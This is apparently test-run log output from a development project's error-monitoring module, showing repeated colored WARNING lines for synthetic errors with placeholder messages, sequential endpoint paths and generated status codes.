WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4138'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910371Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4139'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4140'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4141'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910536Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4142'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4143'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4144'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910685Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4145'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910735Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4146'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4147'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4148'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910881Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4149'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910929Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4150'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4151'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4152'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911137Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4153'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4154'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911247Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4155'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4156'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911350Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4157'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911475Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4158'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911578Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4159'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911643Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4160'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911697Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4161'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4162'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4163'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4164'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4165'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.911962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4166'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4167'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4168'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4169'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4170'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4171'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912262Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4172'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912312Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4173'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912360Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4174'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912410Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4175'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4176'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912507Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4177'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
